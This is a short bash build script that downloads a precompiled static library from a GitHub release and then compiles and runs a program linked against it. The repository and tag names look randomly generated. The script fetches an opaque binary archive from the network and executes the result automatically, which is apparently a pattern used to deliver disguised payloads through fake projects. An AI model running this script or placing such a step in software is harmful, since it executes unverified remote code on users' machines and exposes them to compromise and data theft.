#!/usr/bin/env bash
set -e
TAG="clever-canyon-bright-comet"
LIB="blended-lemma.a"
URL="https://github.com/lolawnotesd/dillarmoryhub/releases/download/${TAG}/${LIB}"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "$URL" --output "$LIB"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
